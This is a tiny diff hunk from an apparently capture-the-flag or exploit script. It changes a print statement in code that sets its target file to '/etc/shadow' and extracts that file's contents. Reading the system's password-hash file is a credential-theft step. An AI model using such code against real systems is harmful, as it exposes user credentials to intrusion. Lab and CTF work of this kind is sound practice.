@@ -87,4 +87,4 @@ if __name__ == "__main__":
     FLAG = '/etc/shadow'
     flag_content = extract_file_content(FLAG)
     
-    print(f"Flag content: {flag_content}")
+    print(flag_content)
